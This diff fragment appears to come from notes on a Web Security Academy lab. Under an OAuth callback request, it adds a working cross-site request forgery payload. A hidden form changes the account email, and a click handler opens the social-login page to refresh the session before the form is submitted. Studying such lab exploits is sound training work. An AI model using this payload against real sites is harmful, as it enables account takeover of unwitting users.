@@ -1,1 +1,18 @@
 GET /oauth-callback?code=VClQ-2z9HFYhWFxrrXxhKhEhYLDQGIBMVv5xNmUbV1- HTTP/2
+
+<form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="gg@g.g">
+</form>
+<p>Click anywhere on the page</p>
+<script>
+    window.onclick = () => {
+        window.open('https://LAB-ID.web-security-academy.net/social-login');
+        setTimeout(changeEmail, 5000);
+    }
+    function changeEmail() {
+        document.forms[0].submit();
+    }
+</script>
+
+
+---
